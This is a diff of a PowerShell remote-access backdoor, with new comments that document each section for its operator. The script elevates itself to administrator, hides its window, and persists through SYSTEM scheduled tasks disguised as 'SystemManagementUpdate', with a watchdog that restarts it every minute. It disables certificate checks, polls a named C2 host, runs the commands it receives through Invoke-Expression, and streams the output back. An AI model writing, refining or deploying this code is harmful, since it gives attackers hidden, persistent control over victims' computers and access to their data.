@@ -1,24 +1,40 @@
+# ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║  CONFIGURATION                                                             ║
+# ║  Edit these values to match your setup. All features reference these vars. ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
 $cfHost = "https://connect.aniketpandey.website"
+$maxRetries = 10
+$cmdTimeout = 300   # default timeout — use 'notimeout:' prefix or 'cancel' for manual control
+$maxChunkBytes = 32000  # cap per-chunk size
+$clientId = "$($env:COMPUTERNAME)-$($env:USERNAME)"
+
+# ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║  SELF-PATH RESOLUTION                                                      ║
+# ║  Determines script location for logging, persistence, and EXE detection.   ║
+# ║  Required by: LOGGING, PERSISTENCE, ADMIN ELEVATION                        ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
 $selfPath = $PSCommandPath
 if (-not $selfPath) { $selfPath = $MyInvocation.MyCommand.Path }
 if (-not $selfPath) { $selfPath = (Get-Process -Id $PID).Path }
 $scriptDir = if ($PSScriptRoot) { $PSScriptRoot } elseif ($selfPath) { Split-Path -Parent $selfPath } else { $env:TEMP }
-$logFile = Join-Path $scriptDir "shell.txt"
-$maxLogSizeMB = 5
-$retryCount = 0
-$maxRetries = 10
-$cmdTimeout = 300   # default timeout — use 'notimeout:' prefix or 'cancel' for manual control
-$maxChunkBytes = 32000  # cap per-chunk size
-$clientId = "$($env:COMPUTERNAME)-$($env:USERNAME)"  # unique identifier sent to server on every request
-$taskName = "SystemManagementUpdate"
-$watchdogTaskName = "SystemManagementUpdateWatchdog"
 $isExePayload = ($selfPath -and [System.IO.Path]::GetExtension($selfPath).ToLower() -eq ".exe")
+
+# ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║  SINGLE-INSTANCE MUTEX                                                     ║
+# ║  Prevents duplicate copies from running simultaneously.                    ║
+# ║  Safe to remove if you don't use the watchdog task.                        ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
 $mutexName = "Global\SystemManagementUpdateMutex"
 $createdNew = $false
 $script:singleInstanceMutex = New-Object System.Threading.Mutex($true, $mutexName, [ref]$createdNew)
 if (-not $createdNew) { exit }
 
-# --- Self-elevate to admin and relaunch hidden ---
+# ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║  ADMIN ELEVATION                                                           ║
+# ║  Re-launches itself as Administrator in a hidden window if not already.    ║
+# ║  Required by: PERSISTENCE (needs admin to register SYSTEM tasks)           ║
+# ║  To remove: delete this block; script will run as current user.            ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
 $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
 if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
     if ($isExePayload) {
@@ -29,7 +45,15 @@ if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Adm
     exit
 }
 
-# --- Persistence (skip if tasks already exist — avoids redundant re-registration) ---
+# ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║  PERSISTENCE (Scheduled Tasks)                                             ║
+# ║  Two tasks: main (startup+logon) + watchdog (every 1 min).                ║
+# ║  Survives: reboot, shutdown, user killing process from Task Manager.       ║
+# ║  To remove: delete this block, and also remove $taskName/$watchdogTaskName ║
+# ║  from CONFIGURATION. Script will run only once until manually restarted.   ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
+$taskName = "SystemManagementUpdate"
+$watchdogTaskName = "SystemManagementUpdateWatchdog"
 $action = if ($isExePayload) {
     New-ScheduledTaskAction -Execute $selfPath
 } else {
@@ -52,7 +76,16 @@ if (-not (Get-ScheduledTask -TaskName $watchdogTaskName -ErrorAction SilentlyCon
     Register-ScheduledTask -TaskName $watchdogTaskName -Action $watchdogAction -Trigger $watchdogTrigger -Settings $settings -Principal $principal -Force | Out-Null
 }
 
-# --- Logging ---
+# ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║  LOGGING (shell.txt)                                                       ║
+# ║  Writes timestamped logs to shell.txt beside the script.                   ║
+# ║  Auto-rotates at 5 MB. Safe to remove entirely — replace all Write-Log    ║
+# ║  calls with nothing. Also remove $logFile and $maxLogSizeMB from CONFIG.   ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
+$logFile = Join-Path $scriptDir "shell.txt"
+$maxLogSizeMB = 5
+$retryCount = 0
+
 function Write-Log {
     param([string]$Message, [string]$Level = "INFO")
     $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
@@ -68,13 +101,18 @@ function Write-Log {
     } catch {}
 }
 
-# --- HTTP setup ---
+# ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║  TLS + SSL CERTIFICATE BYPASS                                             ║
+# ║  Enables TLS 1.2/1.3 and bypasses cert validation for SYSTEM account.     ║
+# ║  SYSTEM's cert store lacks Cloudflare root CAs — this fixes SSL errors.   ║
+# ║  To remove: delete this block. Only safe if running as a normal user       ║
+# ║  whose cert store trusts your C2 domain's certificate chain.               ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
 [System.Net.ServicePointManager]::DefaultConnectionLimit = 4
 [System.Net.ServicePointManager]::Expect100Continue = $false
 try { [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls13 } catch {
     try { [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 } catch {}
 }
-# Bypass SSL cert validation — SYSTEM account lacks Cloudflare root CAs in its cert store
 try {
     if (-not ([System.Management.Automation.PSTypeName]'TrustAllCertsPolicy').Type) {
         Add-Type @"
@@ -87,11 +125,14 @@ public class TrustAllCertsPolicy : ICertificatePolicy {
     }
     [System.Net.ServicePointManager]::CertificatePolicy = [TrustAllCertsPolicy]::new()
 } catch {
-    # Fallback for newer .NET: use callback
     [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
 }
 
-# --- HTTP helpers ---
+# ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║  HTTP HELPERS                                                              ║
+# ║  Core transport layer — sends/receives data to the C2 server.             ║
+# ║  Do NOT remove — required by STREAMING EXECUTION and MAIN LOOP.           ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
 function Send-Http {
     param([string]$Url, [string]$Method = "GET", [string]$Body = $null, [int]$TimeoutMs = 10000)
     $req = [System.Net.HttpWebRequest]::Create($Url)
@@ -101,7 +142,6 @@ function Send-Http {
     $req.Timeout = $TimeoutMs
     $req.ReadWriteTimeout = $TimeoutMs
     if ($Method -eq "POST" -and $Body) {
-        # Truncate oversized body (byte-based, not character-based)
         $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($Body)
         if ($bodyBytes.Length -gt $maxChunkBytes) {
             $Body = [System.Text.Encoding]::UTF8.GetString($bodyBytes, 0, $maxChunkBytes) + "`n[...truncated]"
@@ -141,7 +181,12 @@ function Send-Result-To-Server {
     catch { Write-Log "Result send failed: $($_.Exception.Message)" "WARN" }
 }
 
-# --- Persistent runspace (shared across commands, lazy re-creation) ---
+# ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║  PERSISTENT RUNSPACE                                                       ║
+# ║  Keeps a single PowerShell runspace alive across commands so state (cd,    ║
+# ║  variables, modules) persists between commands.                            ║
+# ║  Do NOT remove — required by STREAMING EXECUTION.                         ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
 $script:persistentRunspace = $null
 
 function Get-PersistentRunspace {
@@ -154,16 +199,22 @@ function Get-PersistentRunspace {
     return $script:persistentRunspace
 }
 
-# --- Execute command with streaming output + cancel support ---
+# ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║  STREAMING EXECUTION                                                       ║
+# ║  Runs commands asynchronously with real-time output streaming back to      ║
+# ║  the server. Supports: timeout, notimeout: prefix, cancel signal.         ║
+# ║  Do NOT remove — this is the core command execution engine.               ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
 function Invoke-CommandStreaming {
     param([string]$Command, [int]$Timeout = $cmdTimeout)
 
-    # Handle notimeout: prefix — disable timeout for approved long jobs
+    # --- notimeout: prefix support (removable) ---
     $noTimeout = $false
     if ($Command -match '^notimeout:(.+)$') {
         $Command = $Matches[1].Trim()
         $noTimeout = $true
     }
+    # --- end notimeout ---
 
     # 1) Send header — read cwd from persistent runspace (reflects cd changes)
     $timeoutLabel = if ($noTimeout) { "no-timeout" } else { "${Timeout}s" }
@@ -182,7 +233,6 @@ function Invoke-CommandStreaming {
     $ps = [powershell]::Create()
     $ps.Runspace = $runspace
 
-    # Out-String -Stream gives us line-by-line output for streaming
     $ps.AddScript(@"
         try {
             Invoke-Expression `$args[0] 2>&1 | Out-String -Stream
@@ -202,9 +252,8 @@ function Invoke-CommandStreaming {
     $finished = $false
     $idleCycles = 0
 
-    # 3) Adaptive streaming loop — drain output + check cancel
+    # 3) Adaptive streaming loop — drain output + check cancel/timeout
     while (-not $handle.IsCompleted) {
-        # Adaptive interval: fast when output flows, slower when idle
         $sleepMs = if ($idleCycles -le 0) { 200 } elseif ($idleCycles -le 5) { 500 } else { 1000 }
         Start-Sleep -Milliseconds $sleepMs
 
@@ -224,7 +273,7 @@ function Invoke-CommandStreaming {
             $idleCycles++
         }
 
-        # Check timeout (skip if notimeout mode)
+        # --- TIMEOUT CHECK (removable — commands will run indefinitely) ---
         if (-not $noTimeout) {
             $elapsed = ((Get-Date) - $startTime).TotalSeconds
             if ($elapsed -gt $Timeout) {
@@ -235,8 +284,9 @@ function Invoke-CommandStreaming {
                 break
             }
         }
+        # --- end timeout check ---
 
-        # Check for cancel signal from operator
+        # --- CANCEL SIGNAL CHECK (removable — operator won't be able to cancel) ---
         $signal = Get-Signal-From-Server
         if ($signal -eq "cancel") {
             $ps.Stop()
@@ -245,9 +295,10 @@ function Invoke-CommandStreaming {
             $finished = $true
             break
         }
+        # --- end cancel signal ---
     }
 
-    # 4) Drain any remaining output and send as final result
+    # 4) Drain remaining output and send as final result
     if (-not $finished) {
         $currentCount = $outputCollection.Count
         $chunk = ""
@@ -256,7 +307,6 @@ function Invoke-CommandStreaming {
                 $chunk += [string]$outputCollection[$i] + "`n"
             }
         }
-        # Send final result (even if empty — triggers prompt on server)
         Send-Result-To-Server -Body $chunk
     }
 
@@ -264,7 +314,12 @@ function Invoke-CommandStreaming {
     try { $ps.Dispose() } catch {}
 }
 
-# --- Main loop ---
+# ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║  MAIN LOOP                                                                ║
+# ║  Polls the server for commands, executes them, and reconnects on failure. ║
+# ║  Adaptive polling: 1s → 3s → 5s when idle. Exponential backoff on error. ║
+# ║  Do NOT remove — this is the entry point.                                 ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
 function Connect-Cloudflare {
     $activeDelay   = 300
     $idleStep1     = 1000
@@ -291,7 +346,6 @@ function Connect-Cloudflare {
                     break
                 }
 
-                # Streaming execution — handles all output sending internally
                 Invoke-CommandStreaming -Command $command
 
                 Start-Sleep -Milliseconds $activeDelay
@@ -316,8 +370,6 @@ function Connect-Cloudflare {
                 $retryCount = 0
             }
         }
-
-        # GC removed — CLR manages collections naturally without forced pauses
     }
 }
 
